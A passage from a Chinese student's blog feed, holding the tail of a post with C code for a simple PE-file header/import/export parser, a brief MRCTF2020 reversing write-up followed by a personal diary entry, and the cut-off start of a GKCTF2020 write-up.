&lt;p&gt;&lt;strong&gt;char&lt;/strong&gt; DataDirectoryName[][50] = { &amp;ldquo;EXPORT Directory&amp;rdquo;,&amp;ldquo;IMPORT Directory&amp;rdquo;,&amp;ldquo;RESOURCE Directory&amp;rdquo;,&amp;ldquo;EXCEPTION Directory&amp;rdquo;,&amp;ldquo;SECURITY Directory&amp;rdquo;,&amp;ldquo;BASERELOC Directory&amp;rdquo;,&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&amp;ldquo;DEBUG Directory&amp;rdquo;,&amp;ldquo;COPYRIGHT Directory&amp;rdquo;,&amp;ldquo;GLOBALPTR Directory&amp;rdquo;,&amp;ldquo;TLS Directory&amp;rdquo;,&amp;ldquo;LOAD_CONFIG Directory&amp;rdquo;,&amp;ldquo;BOUND_IMPORT Directory&amp;rdquo;,&amp;ldquo;IAT Directory&amp;rdquo;,&amp;ldquo;DELAY_IMPORT Directory&amp;rdquo;,&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&amp;ldquo;COM_DESCRIPTOR Directory&amp;rdquo;,&amp;ldquo;Reserved Directory&amp;rdquo; };&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;for&lt;/strong&gt; (&lt;strong&gt;int&lt;/strong&gt; i = 0; i &amp;lt; pNtHeader-&amp;gt;OptionalHeader.NumberOfRvaAndSizes; i++) {&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;%s : 0x%08X 0x%08X\n&amp;quot;, DataDirectoryName[i], pNtHeader-&amp;gt;OptionalHeader.DataDirectory[i].VirtualAddress,pNtHeader-&amp;gt;OptionalHeader.DataDirectory[i].Size);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;节区表：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184249736-1321279432.png&#34;
	width=&#34;576&#34;
	height=&#34;247&#34;
	srcset=&#34;https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184249736-1321279432_hu17860047615978083728.png 480w, https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184249736-1321279432_hu13259137008035054397.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;233&#34;
		data-flex-basis=&#34;559px&#34;
	
&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\n===================================PE SECTION HEADER====================================\n\n&amp;quot;);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;//PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pNtHeader);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((&lt;strong&gt;DWORD&lt;/strong&gt;)pNtHeader + &lt;strong&gt;sizeof&lt;/strong&gt;(IMAGE_NT_HEADERS));&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;for&lt;/strong&gt; (&lt;strong&gt;int&lt;/strong&gt; i = 0; i &amp;lt; pNtHeader-&amp;gt;FileHeader.NumberOfSections; i++) {&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;stction %d&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;ndash;\n\n&amp;quot;,i+1);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;for&lt;/strong&gt; (&lt;strong&gt;int&lt;/strong&gt; j = 0; j &amp;lt; IMAGE_SIZEOF_SHORT_NAME; j++) {&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;%c&amp;quot;, pSectionHeader-&amp;gt;Name[j]);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;}//name的名称可能和实际作用没什么联系&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot; 0x&amp;quot;);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;for&lt;/strong&gt; (&lt;strong&gt;int&lt;/strong&gt; j = 0; j &amp;lt; IMAGE_SIZEOF_SHORT_NAME; j++) {&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;%X&amp;quot;, pSectionHeader-&amp;gt;Name[j]);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\nVirtualSize : 0x%04X&amp;quot;, pSectionHeader-&amp;gt;Misc.VirtualSize); //内存中节区所占大小&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\nVirtualAddress : 0x%08X&amp;quot;, pSectionHeader-&amp;gt;VirtualAddress); //内存中节区起始地址&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\nSizeOfRawData : 0x%08X&amp;quot;, pSectionHeader-&amp;gt;SizeOfRawData); //磁盘文件节区所占大小&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\nPointerToRawData : 0x%08X&amp;quot;, pSectionHeader-&amp;gt;PointerToRawData); //磁盘文件中节区起始位置&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\nPointerToRelocations : 0x%08X&amp;quot;, pSectionHeader-&amp;gt;PointerToRelocations);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\nPointerToLinenumbers : 0x%08X&amp;quot;, pSectionHeader-&amp;gt;PointerToLinenumbers);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\nNumberOfRelocations : 0x%04X&amp;quot;, pSectionHeader-&amp;gt;NumberOfRelocations);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\nNumberOfLinenumbers : 0x%04X&amp;quot;, pSectionHeader-&amp;gt;NumberOfLinenumbers);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\nCharacteristics : 0x%08X&amp;quot;, pSectionHeader-&amp;gt;Characteristics);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;pSectionHeader++;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\n\n&amp;quot;);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;输入表：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184250338-141544704.png&#34;
	width=&#34;576&#34;
	height=&#34;232&#34;
	srcset=&#34;https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184250338-141544704_hu1250800568492237595.png 480w, https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184250338-141544704_hu4649855468827844214.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;248&#34;
		data-flex-basis=&#34;595px&#34;
	
&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\n===================================PE IMPORT====================================\n&amp;quot;);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;DWORD&lt;/strong&gt; pImportOffset = RVA_to_RAW(pNtHeader,pNtHeader-&amp;gt;OptionalHeader.DataDirectory[1].VirtualAddress);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((&lt;strong&gt;DWORD&lt;/strong&gt;)pbFile + pImportOffset);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;while&lt;/strong&gt; (1) {&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;if&lt;/strong&gt; (pImport-&amp;gt;FirstThunk == 0 &amp;amp;&amp;amp; pImport-&amp;gt;ForwarderChain == 0 &amp;amp;&amp;amp; pImport-&amp;gt;Name == 0 &amp;amp;&amp;amp; pImport-&amp;gt;OriginalFirstThunk == 0 &amp;amp;&amp;amp; pImport-&amp;gt;TimeDateStamp == 0) {&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;break&lt;/strong&gt; ;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;DWORD&lt;/strong&gt; dwINT = (&lt;strong&gt;DWORD&lt;/strong&gt;)pbFile + RVA_to_RAW(pNtHeader, pImport-&amp;gt;OriginalFirstThunk);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;DWORD&lt;/strong&gt; dwTimeDateStamp = (&lt;strong&gt;DWORD&lt;/strong&gt;)pbFile + RVA_to_RAW(pNtHeader, pImport-&amp;gt;TimeDateStamp);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;DWORD&lt;/strong&gt; dwForwarderChain = (&lt;strong&gt;DWORD&lt;/strong&gt;)pbFile + RVA_to_RAW(pNtHeader, pImport-&amp;gt;ForwarderChain);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;DWORD&lt;/strong&gt; dwName = (&lt;strong&gt;DWORD&lt;/strong&gt;)pbFile + RVA_to_RAW(pNtHeader, pImport-&amp;gt;Name);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;DWORD&lt;/strong&gt; dwFirstThunk = (&lt;strong&gt;DWORD&lt;/strong&gt;)pbFile + RVA_to_RAW(pNtHeader, pImport-&amp;gt;FirstThunk);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;- %s &amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash;-\n&amp;quot;,dwName);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;TimeDateStamp: 0x%08X\n&amp;rdquo;, pImport-&amp;gt;TimeDateStamp);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;ForwarderChain: 0x%08X\n&amp;rdquo;, pImport-&amp;gt;ForwarderChain);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;pImport-&amp;gt;FirstThunk: 0x%X\n&amp;rdquo;, pImport-&amp;gt;FirstThunk);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;DWORD&lt;/strong&gt; * ImportByName = (&lt;strong&gt;DWORD&lt;/strong&gt; *)dwINT;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;DWORD&lt;/strong&gt; * pFirstThunk = (&lt;strong&gt;DWORD&lt;/strong&gt; *)dwFirstThunk;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;int&lt;/strong&gt; i = 0;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\nAddress\t\tHint\tName\n&amp;quot;);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;while&lt;/strong&gt; ((ImportByName[i])) {&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PIMAGE_IMPORT_BY_NAME pImpoetByName = (PIMAGE_IMPORT_BY_NAME)((&lt;strong&gt;DWORD&lt;/strong&gt;)pbFile + RVA_to_RAW(pNtHeader, ImportByName[i]));&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;0x%04X\t&amp;rdquo;, pFirstThunk[i]);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;0x%04X\t&amp;rdquo;,pImpoetByName-&amp;gt;Hint);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;%s\n&amp;quot;, pImpoetByName-&amp;gt;Name);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;i++;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;dwINT++;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;pImport++;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;输出表：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184250795-1696792118.png&#34;
	width=&#34;576&#34;
	height=&#34;201&#34;
	srcset=&#34;https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184250795-1696792118_hu11622067888829562249.png 480w, https://dorinxl.github.io/p/c%E8%AF%AD%E8%A8%80%E7%9A%84pelode%E7%BC%96%E5%86%99%E8%AE%B0%E5%BD%95/1858293-20200723184250795-1696792118_hu13557880360611533219.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;286&#34;
		data-flex-basis=&#34;687px&#34;
	
&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\n===================================PE EXPORT====================================\n&amp;quot;);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((&lt;strong&gt;DWORD&lt;/strong&gt;)pbFile + RVA_to_RAW(pNtHeader, pNtHeader-&amp;gt;OptionalHeader.DataDirectory[0].VirtualAddress));&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;Characteristics : 0x%X\n&amp;rdquo;, pExport-&amp;gt;Characteristics);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;TimeDateStamp : 0x%X\n&amp;rdquo;, pExport-&amp;gt;TimeDateStamp);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;MajorVersion : 0x%X\n&amp;rdquo;, pExport-&amp;gt;MajorVersion);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;MinorVersion : 0x%X\n&amp;rdquo;, pExport-&amp;gt;MinorVersion);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;Base : 0x%X\n&amp;rdquo;, pExport-&amp;gt;Base);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;NumberOfNames: %d\n&amp;rdquo;, pExport-&amp;gt;NumberOfNames);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;NumberOfFunctions: %d\n&amp;rdquo;, pExport-&amp;gt;NumberOfFunctions);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;DWORD&lt;/strong&gt; * AddressOfFunctions = (&lt;strong&gt;DWORD&lt;/strong&gt; *)((&lt;strong&gt;DWORD&lt;/strong&gt;)pbFile + RVA_to_RAW(pNtHeader, pExport-&amp;gt;AddressOfFunctions));&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;DWORD&lt;/strong&gt; * AddressOfNameOrdinals = (&lt;strong&gt;DWORD&lt;/strong&gt; *)((&lt;strong&gt;DWORD&lt;/strong&gt;)pbFile + RVA_to_RAW(pNtHeader, pExport-&amp;gt;AddressOfNameOrdinals));&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;DWORD&lt;/strong&gt; * AddressOfNames = (&lt;strong&gt;DWORD&lt;/strong&gt; *)((&lt;strong&gt;DWORD&lt;/strong&gt;)pbFile + RVA_to_RAW(pNtHeader, pExport-&amp;gt;AddressOfNames));&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;DWORD&lt;/strong&gt; * Name = (&lt;strong&gt;DWORD&lt;/strong&gt; *)((&lt;strong&gt;DWORD&lt;/strong&gt;)pbFile + RVA_to_RAW(pNtHeader, pExport-&amp;gt;Name));&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;WORD&lt;/strong&gt; * pwOrdinals = (&lt;strong&gt;WORD&lt;/strong&gt; *)((&lt;strong&gt;DWORD&lt;/strong&gt;)pbFile + RVA_to_RAW(pNtHeader, pExport-&amp;gt;AddressOfNameOrdinals));&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol start=&#34;16&#34;&gt;
&lt;li&gt;&lt;strong&gt;if&lt;/strong&gt; (pExport-&amp;gt;NumberOfFunctions == 0) {&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;quot;\n\t&amp;mdash;&amp;mdash;&amp;mdash;- No Export Tabel! &amp;mdash;&amp;mdash;&amp;mdash;-\n&amp;quot;);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;if&lt;/strong&gt; (NULL != pbFile)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;{&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;UnmapViewOfFile(pbFile);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol start=&#34;23&#34;&gt;
&lt;li&gt;&lt;strong&gt;if&lt;/strong&gt; (NULL != hMapping)&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;{&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CloseHandle(hMapping);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol start=&#34;28&#34;&gt;
&lt;li&gt;&lt;strong&gt;if&lt;/strong&gt; (INVALID_HANDLE_VALUE != hFile)&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;{&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;CloseHandle(hFile);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol start=&#34;33&#34;&gt;
&lt;li&gt;&lt;strong&gt;return&lt;/strong&gt; 0;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol start=&#34;36&#34;&gt;
&lt;li&gt;&lt;strong&gt;for&lt;/strong&gt; (&lt;strong&gt;int&lt;/strong&gt; i = 0; i &amp;lt; pExport-&amp;gt;NumberOfNames; i++) {&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;DWORD&lt;/strong&gt; dwName = (&lt;strong&gt;DWORD&lt;/strong&gt;)pbFile + RVA_to_RAW(pNtHeader, AddressOfNames[i]);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;DWORD&lt;/strong&gt; VA = pNtHeader-&amp;gt;OptionalHeader.ImageBase + AddressOfFunctions[i];&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;printf(&amp;ldquo;Ordinals: %d\tName: %-30s\tRVA: 0x%08X\tVA: 0x%08X\n&amp;rdquo;, pwOrdinals[i], dwName, AddressOfFunctions[i], VA);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;在输入输出表这里遇到了新的问题：在知晓如何把RVA转化成RAW之后，要再次以新的RAW和起始地址找新的结构，这个时候利用了指针指向把数据输出，我一直输出的是指针存放的地址，所以非常难受。&lt;/p&gt;
&lt;p&gt;整个代码已经上传至github和gitee：&lt;/p&gt;
&lt;p&gt;Github：https://github.com/DorinXL/Easy_PEInfo&lt;/p&gt;
&lt;p&gt;Gitee： &lt;a class=&#34;link&#34; href=&#34;https://gitee.com/dorinxl/Easy_PEInfo&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://gitee.com/dorinxl/Easy_PEInfo&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【MRCTF2020】hello_world_go</title>
        <link>https://dorinxl.github.io/p/mrctf2020hello_world_go/</link>
        <pubDate>Tue, 09 Jun 2020 02:59:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/mrctf2020hello_world_go/</guid>
        <description>&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/mrctf2020hello_world_go/1858293-20200609105903289-1443915136.png&#34;
	width=&#34;500&#34;
	height=&#34;426&#34;
	srcset=&#34;https://dorinxl.github.io/p/mrctf2020hello_world_go/1858293-20200609105903289-1443915136_hu10233851895167644210.png 480w, https://dorinxl.github.io/p/mrctf2020hello_world_go/1858293-20200609105903289-1443915136_hu15946682006413677930.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;117&#34;
		data-flex-basis=&#34;281px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;最近心烦意乱的，好几天没刷题。&lt;/p&gt;
&lt;p&gt;大物老师也不讲题，自习是吧，BUU上找个题找找感觉好了。&lt;/p&gt;
&lt;p&gt;GO语言写的，随便点点：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/mrctf2020hello_world_go/1858293-20200609105903877-385284605.png&#34;
	width=&#34;1190&#34;
	height=&#34;602&#34;
	srcset=&#34;https://dorinxl.github.io/p/mrctf2020hello_world_go/1858293-20200609105903877-385284605_hu17093925282447096302.png 480w, https://dorinxl.github.io/p/mrctf2020hello_world_go/1858293-20200609105903877-385284605_hu10996505878774995846.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;197&#34;
		data-flex-basis=&#34;474px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;点出来flag了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/mrctf2020hello_world_go/1858293-20200609105904295-541012828.png&#34;
	width=&#34;522&#34;
	height=&#34;411&#34;
	srcset=&#34;https://dorinxl.github.io/p/mrctf2020hello_world_go/1858293-20200609105904295-541012828_hu15101043235858035653.png 480w, https://dorinxl.github.io/p/mrctf2020hello_world_go/1858293-20200609105904295-541012828_hu6718711381883942905.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;127&#34;
		data-flex-basis=&#34;304px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;flag{hello_world_gogogo}&lt;/p&gt;
&lt;p&gt;行吧题都水完了，我还想bb两句。（把博客当日记估计只有我了）&lt;/p&gt;
&lt;p&gt;到期末复习的时候了，结果高数大物还得从头学（谢谢猴博士救我狗命）&lt;/p&gt;
&lt;p&gt;考试形式咱也不知道。C++又要自己写个什么系统，还要每个人网上答辩，好麻烦。&lt;/p&gt;
&lt;p&gt;六月比赛好多，七月也是。还要复习。&lt;/p&gt;
&lt;p&gt;自愿返校当然是不回去，那么远的路去一趟不是白花钱么。&lt;/p&gt;
&lt;p&gt;报了个什么比赛提交作品被out了，另一队晋级了，感觉自己好废。&lt;/p&gt;
&lt;p&gt;最近自学数据结构，然后为了加强动态调试的能力还开始攻读《逆向工程核心原理》&lt;/p&gt;
&lt;p&gt;好几天没更博客我真的没在玩。&lt;/p&gt;
&lt;p&gt;见的越多越觉得自己啥也不会。真的什么也不会了，学了半年逆向没什么大的突破。&lt;/p&gt;
&lt;p&gt;考虑闭关学习知识，但是还有考试，好几把烦。&lt;/p&gt;
&lt;p&gt;暑假还得练驾照，根本不想碰车，我吐了。&lt;/p&gt;
&lt;p&gt;活得真难，那咋办嘛。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【GKCTF2020】Chelly’s identity</title>
        <link>https://dorinxl.github.io/p/gkctf2020chellys-identity/</link>
        <pubDate>Sun, 31 May 2020 10:55:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/gkctf2020chellys-identity/</guid>
        <description>&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185445118-547101262.png&#34;
	width=&#34;500&#34;
	height=&#34;440&#34;
	srcset=&#34;https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185445118-547101262_hu4517936439998635063.png 480w, https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185445118-547101262_hu13231442404943330519.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;113&#34;
		data-flex-basis=&#34;272px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;这是一道当时比赛没做出来的题，沉迷口袋妖怪。&lt;/p&gt;
&lt;p&gt;没做出来是因为看着这花里胡哨的IDA就不想做了【不是】&lt;/p&gt;
&lt;p&gt;事后冷静分析一波，挺多干扰的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185445601-104923569.png&#34;
	width=&#34;602&#34;
	height=&#34;586&#34;
	srcset=&#34;https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185445601-104923569_hu6522688673853411496.png 480w, https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185445601-104923569_hu2885769911136838773.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;102&#34;
		data-flex-basis=&#34;246px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;简单来讲就是输入之后进行处理然后对比。IDA反编译出来的语句太迷了看的我头都大了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185445900-928219626.png&#34;
	width=&#34;586&#34;
	height=&#34;189&#34;
	srcset=&#34;https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185445900-928219626_hu6870079476910199706.png 480w, https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185445900-928219626_hu16728994288860106546.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;310&#34;
		data-flex-basis=&#34;744px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;↑这个是处理输入位数的，要16位。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185446358-1239293453.png&#34;
	width=&#34;825&#34;
	height=&#34;294&#34;
	srcset=&#34;https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185446358-1239293453_hu16931281536630081672.png 480w, https://dorinxl.github.io/p/gkctf2020chellys-identity/1858293-20200531185446358-1239293453_hu15897280621532640088.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
